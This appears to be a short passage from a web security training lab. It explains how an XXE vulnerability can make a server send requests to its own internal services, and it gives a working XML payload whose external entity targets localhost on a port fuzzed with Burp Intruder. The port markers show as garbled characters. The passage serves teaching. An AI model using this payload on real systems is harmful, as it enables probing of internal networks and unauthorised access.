Consider a scenario where a vulnerable server hosts another web application internally on a non-standard port. An attacker can exploit an XXE vulnerability that makes the server send a request to its own internal network resource.

For example, using the captured request from the in-band XXE task, send the captured request to Burp Intruder and use the payload below:

<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:ยง10ยง/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
